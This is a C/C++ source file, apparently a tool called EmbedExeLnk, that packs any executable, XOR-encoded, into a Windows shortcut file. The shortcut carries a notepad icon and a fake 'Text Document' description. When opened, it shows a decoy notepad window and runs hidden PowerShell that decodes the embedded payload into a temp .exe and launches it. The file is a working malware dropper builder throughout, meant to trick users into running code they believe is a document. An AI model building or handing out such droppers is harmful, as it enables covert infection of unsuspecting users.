#include <stdio.h>
#include <iostream>
#include <windows.h>

#define INVALID_SET_FILE_POINTER 0xFFFFFFFF

#define HasName 0x00000004
#define HasArguments 0x00000020
#define HasIconLocation 0x00000040
#define IsUnicode 0x00000080
#define HasExpString 0x00000200
#define PreferEnvironmentPath 0x02000000

#pragma warning(disable:4996)

struct ShellLinkHeaderStruct
{
	DWORD dwHeaderSize;
	CLSID LinkCLSID;
	DWORD dwLinkFlags;
	DWORD dwFileAttributes;
	FILETIME CreationTime;
	FILETIME AccessTime;
	FILETIME WriteTime;
	DWORD dwFileSize;
	DWORD dwIconIndex;
	DWORD dwShowCommand;
	WORD wHotKey;
	WORD wReserved1;
	DWORD dwReserved2;
	DWORD dwReserved3;
};

const wchar_t* GetWC(const char* c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	mbstowcs(wc, c, cSize);

	return wc;
}

struct EnvironmentVariableDataBlockStruct
{
	DWORD dwBlockSize;
	DWORD dwBlockSignature;
	char szTargetAnsi[MAX_PATH];
	wchar_t wszTargetUnicode[MAX_PATH];
};

DWORD CreateLinkFile(char* pExePath, char* pOutputLinkPath, char* pLinkIconPath, char* pLinkDescription)
{
	HANDLE hLinkFile = NULL;
	HANDLE hExeFile = NULL;
	ShellLinkHeaderStruct ShellLinkHeader;
	EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;
	DWORD dwBytesWritten = 0;
	WORD wLinkDescriptionLength = 0;
	wchar_t wszLinkDescription[512];
	WORD wCommandLineArgumentsLength = 0;
	wchar_t wszCommandLineArguments[8192];
	WORD wIconLocationLength = 0;
	wchar_t wszIconLocation[512];
	BYTE bExeDataBuffer[1024];
	DWORD dwBytesRead = 0;
	DWORD dwEndOfLinkPosition = 0;
	DWORD dwCommandLineArgsStartPosition = 0;
	wchar_t* pCmdLinePtr = NULL;
	wchar_t wszOverwriteSkipBytesValue[16];
	wchar_t wszOverwriteSearchLnkFileSizeValue[16];
	BYTE bXorEncryptValue = 0;
	DWORD dwTotalFileSize = 0;

	// set xor encrypt value
	bXorEncryptValue = 0x77;

	// create link file
	hLinkFile = CreateFileA(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLinkFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create output file\n");
		return 1;
	}

	// initialise link header
	memset((void*)&ShellLinkHeader, 0, sizeof(ShellLinkHeader));
	ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader);
	CLSIDFromString(L"{00021401-0000-0000-C000-000000000046}", &ShellLinkHeader.LinkCLSID);
	ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;
	ShellLinkHeader.dwFileAttributes = 0;
	ShellLinkHeader.CreationTime.dwHighDateTime = 0;
	ShellLinkHeader.CreationTime.dwLowDateTime = 0;
	ShellLinkHeader.AccessTime.dwHighDateTime = 0;
	ShellLinkHeader.AccessTime.dwLowDateTime = 0;
	ShellLinkHeader.WriteTime.dwHighDateTime = 0;
	ShellLinkHeader.WriteTime.dwLowDateTime = 0;
	ShellLinkHeader.dwFileSize = 0;
	ShellLinkHeader.dwIconIndex = 0;
	ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;
	ShellLinkHeader.wHotKey = 0;

	// write ShellLinkHeader
	if (WriteFile(hLinkFile, (void*)&ShellLinkHeader, sizeof(ShellLinkHeader), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		return 1;
	}

	// set link description
	memset(wszLinkDescription, 0, sizeof(wszLinkDescription));
	mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1);
	wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);

	// write LinkDescriptionLength
	if (WriteFile(hLinkFile, (void*)&wLinkDescriptionLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// write LinkDescription
	if (WriteFile(hLinkFile, (void*)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set target command-line
	char* homepath = getenv("homepath");
	if (homepath == NULL) {
		/* variable HOMEPATH has not been defined */
	}

	wchar_t* widechar = (wchar_t*)GetWC(homepath);;
	memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments));
	_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%512S/c start notepad C:\\%%HOMEPATH%%\\AppData\\Local\\Google\\Chrome\\User Data\\ZxcvbnData\\3\\passwords.txt && powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = '%%temp%%\\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^& $path;", "", widechar , bXorEncryptValue);
	std::wcout << wszCommandLineArguments << "\n";
	wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);
	if (WriteFile(hLinkFile, (void*)&wCommandLineArgumentsLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// store start of command-line arguments position
	dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL);

	// write CommandLineArguments
	if (WriteFile(hLinkFile, (void*)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set link icon path
	memset(wszIconLocation, 0, sizeof(wszIconLocation));
	mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1);
	wIconLocationLength = (WORD)wcslen(wszIconLocation);

	// write IconLocationLength
	if (WriteFile(hLinkFile, (void*)&wIconLocationLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// write IconLocation
	if (WriteFile(hLinkFile, (void*)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// initialise environment variable data block
	memset((void*)&EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock));
	EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock);
	EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001;
	strncpy(EnvironmentVariableDataBlock.szTargetAnsi, "%windir%\\system32\\cmd.exe", sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1);
	mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1);

	// write EnvironmentVariableDataBlock
	if (WriteFile(hLinkFile, (void*)&EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// store end of link data position
	dwEndOfLinkPosition = GetFileSize(hLinkFile, NULL);

	// open target exe file
	hExeFile = CreateFileA(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hExeFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open exe file\n");

		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// append exe file to the end of the lnk file
	for (;;)
	{
		// read data from exe file
		if (ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &dwBytesRead, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hLinkFile);

			return 1;
		}

		// check for end of file
		if (dwBytesRead == 0)
		{
			break;
		}

		// "encrypt" the exe file data
		for (DWORD i = 0; i < dwBytesRead; i++)
		{
			bExeDataBuffer[i] ^= bXorEncryptValue;
		}

		// write data to lnk file
		if (WriteFile(hLinkFile, bExeDataBuffer, dwBytesRead, &dwBytesWritten, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hLinkFile);

			return 1;
		}
	}

	// close exe file handle
	CloseHandle(hExeFile);

	// store total file size
	dwTotalFileSize = GetFileSize(hLinkFile, NULL);

	// find the offset value of the number of bytes to skip in the command-line arguments
	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"select -Skip 000000)");
	if (pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}
	pCmdLinePtr += strlen("select -Skip ");

	// move the file pointer back to the "000000" value in the command-line arguments
	if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// overwrite link file size
	memset(wszOverwriteSkipBytesValue, 0, sizeof(wszOverwriteSkipBytesValue));
	_snwprintf(wszOverwriteSkipBytesValue, (sizeof(wszOverwriteSkipBytesValue) / sizeof(wchar_t)) - 1, L"%06u", dwEndOfLinkPosition);
	if (WriteFile(hLinkFile, (void*)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// find the offset value of the total lnk file length in the command-line arguments
	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"_.length -eq 0x00000000}");
	if (pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}
	pCmdLinePtr += strlen("_.length -eq ");

	// move the file pointer back to the "0x00000000" value in the command-line arguments
	if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// overwrite link file size
	memset(wszOverwriteSearchLnkFileSizeValue, 0, sizeof(wszOverwriteSearchLnkFileSizeValue));
	_snwprintf(wszOverwriteSearchLnkFileSizeValue, (sizeof(wszOverwriteSearchLnkFileSizeValue) / sizeof(wchar_t)) - 1, L"0x%08X", dwTotalFileSize);
	if (WriteFile(hLinkFile, (void*)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// close output file handle
	CloseHandle(hLinkFile);

	return 0;
}

int main(int argc, char* argv[])
{
	char* pExePath = NULL;
	char* pOutputLinkPath = NULL;

	printf("EmbedExeLnk - www.x86matthew.com\n\n");

	if (argc != 3)
	{
		printf("Usage: %s [exe_path] [output_lnk_path]\n\n", argv[0]);

		return 1;
	}

	// get params
	pExePath = argv[1];
	pOutputLinkPath = argv[2];

	// create a link file containing the target exe
	if (CreateLinkFile(pExePath, pOutputLinkPath, (char *)"%windir%\\system32\\notepad.exe", (char *)"Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23") != 0)
	{
		printf("Error\n");

		return 1;
	}

	printf("Finished\n");

	return 0;
}